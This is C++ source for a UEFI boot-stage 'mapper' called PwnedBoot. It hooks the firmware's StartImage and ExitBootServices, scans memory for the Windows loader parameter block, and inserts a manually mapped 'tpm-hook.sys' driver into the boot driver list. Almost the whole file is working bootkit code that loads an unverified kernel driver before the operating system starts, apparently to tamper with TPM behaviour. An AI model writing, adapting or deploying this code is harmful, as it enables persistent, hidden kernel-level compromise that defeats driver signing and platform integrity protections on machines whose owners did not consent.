#include "Mapper.h"
#include "TpmHookByteContent.h"
#include "Utils.h"

// PwnedBoot Mapper - Boot Driver Injection
// This version works by hooking ExitBootServices to find the LoaderParameterBlock
// and adding the tpm-hook.sys driver to the boot driver list.

typedef EFI_STATUS(EFIAPI* EFI_START_IMAGE)(EFI_HANDLE ImageHandle, UINTN* ExitDataSize, CHAR16** ExitData);
typedef EFI_STATUS(EFIAPI* EFI_EXIT_BOOT_SERVICES)(EFI_HANDLE ImageHandle, UINTN MapKey);

static EFI_START_IMAGE OriginalStartImage = nullptr;
static EFI_EXIT_BOOT_SERVICES OriginalExitBootServices = nullptr;

static PVOID AllocatedDriverBase = nullptr;

static PLOADER_PARAMETER_BLOCK FindLoaderParameterBlock()
{
    // Heuristic scan for LoaderParameterBlock in the common memory region
    // OsMajorVersion: 10, OsMinorVersion: 0, Size: ~0x100-0x1000
    // We scan from 1MB to 1GB at 8-byte alignment.
    for (ULONG_PTR addr = 0x1000000; addr < 0x40000000; addr += 0x8)
    {
        PLOADER_PARAMETER_BLOCK lpb = (PLOADER_PARAMETER_BLOCK)addr;
        if (lpb->OsMajorVersion == 10 && lpb->OsMinorVersion == 0)
        {
            if (lpb->Size >= 0x100 && lpb->Size <= 0x1000)
            {
                // Verify that list pointers look like valid physical addresses in EFI
                if ((ULONG64)lpb->LoadOrderListHead.Flink > 0x1000 && 
                    (ULONG64)lpb->LoadOrderListHead.Flink < 0x0000000800000000) 
                {
                    return lpb;
                }
            }
        }
    }
    return nullptr;
}

static EFI_STATUS EFIAPI HookedExitBootServices(EFI_HANDLE ImageHandle, UINTN MapKey)
{
    gBS->ExitBootServices = OriginalExitBootServices;

    PLOADER_PARAMETER_BLOCK lpb = FindLoaderParameterBlock();
    if (lpb && AllocatedDriverBase)
    {
        // Allocate entry and strings in LoaderData to ensure persistence during kernel transition
        PKLDR_DATA_TABLE_ENTRY entry = nullptr;
        EFI_STATUS status = gBS->AllocatePool(EfiLoaderData, sizeof(KLDR_DATA_TABLE_ENTRY), (void**)&entry);
        
        if (!EFI_ERROR(status) && entry)
        {
            memset(entry, 0, sizeof(KLDR_DATA_TABLE_ENTRY));

            PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)((ULONG_PTR)AllocatedDriverBase + ((PIMAGE_DOS_HEADER)AllocatedDriverBase)->e_lfanew);
            
            entry->DllBase = AllocatedDriverBase;
            entry->SizeOfImage = nt->OptionalHeader.SizeOfImage;
            entry->EntryPoint = (PVOID)((ULONG_PTR)AllocatedDriverBase + nt->OptionalHeader.AddressOfEntryPoint);
            
            // Allocate and copy names for the kernel to reference
            PWCH nameBuf = nullptr;
            gBS->AllocatePool(EfiLoaderData, 100, (void**)&nameBuf);
            if (nameBuf)
            {
                for (int i = 0; i < 13; i++) nameBuf[i] = L"tpm-hook.sys"[i];
                entry->BaseDllName.Buffer = nameBuf;
                entry->BaseDllName.Length = 24;
                entry->BaseDllName.MaximumLength = 26;
            }

            PWCH fullPathBuf = nullptr;
            gBS->AllocatePool(EfiLoaderData, 200, (void**)&fullPathBuf);
            if (fullPathBuf)
            {
                const wchar_t* path = L"\\SystemRoot\\System32\\Drivers\\tpm-hook.sys";
                for (int i = 0; i < 41; i++) fullPathBuf[i] = path[i];
                entry->FullDllName.Buffer = fullPathBuf;
                entry->FullDllName.Length = 80;
                entry->FullDllName.MaximumLength = 82;
            }

            entry->Flags = 0x01; // LDRP_IMAGE_DLL

            // Insert our entry into the BootDriverListHead
            // We insert at the beginning so the kernel processes it early.
            entry->InLoadOrderLinks.Flink = lpb->BootDriverListHead.Flink;
            entry->InLoadOrderLinks.Blink = &lpb->BootDriverListHead;
            lpb->BootDriverListHead.Flink->Blink = &entry->InLoadOrderLinks;
            lpb->BootDriverListHead.Flink = &entry->InLoadOrderLinks;
        }
    }

    return OriginalExitBootServices(ImageHandle, MapKey);
}

static EFI_STATUS EFIAPI HookedStartImage(EFI_HANDLE ImageHandle, UINTN* ExitDataSize, CHAR16** ExitData)
{
    if (!OriginalExitBootServices)
    {
        OriginalExitBootServices = gBS->ExitBootServices;
        gBS->ExitBootServices = HookedExitBootServices;
    }

    return OriginalStartImage(ImageHandle, ExitDataSize, ExitData);
}

NTSTATUS Mapper::MapDriver(PVOID driverBuffer, ULONG driverSize)
{
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)((ULONG_PTR)driverBuffer + ((PIMAGE_DOS_HEADER)driverBuffer)->e_lfanew);
    UINTN pageCount = (nt->OptionalHeader.SizeOfImage + 0xFFF) / 0x1000;
    
    EFI_STATUS status = gBS->AllocatePages(AllocateAnyPages, EfiLoaderData, pageCount, (EFI_PHYSICAL_ADDRESS*)&AllocatedDriverBase);
    if (EFI_ERROR(status)) return (NTSTATUS)status;

    memset(AllocatedDriverBase, 0, nt->OptionalHeader.SizeOfImage);
    memcpy(AllocatedDriverBase, driverBuffer, nt->OptionalHeader.SizeOfHeaders);

    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++)
    {
        PVOID dest = (PVOID)((ULONG_PTR)AllocatedDriverBase + sections[i].VirtualAddress);
        PVOID src = (PVOID)((ULONG_PTR)driverBuffer + sections[i].PointerToRawData);
        memcpy(dest, src, sections[i].SizeOfRawData);
    }

    if (!OriginalStartImage)
    {
        OriginalStartImage = gBS->StartImage;
        gBS->StartImage = HookedStartImage;
    }

    return STATUS_SUCCESS;
}
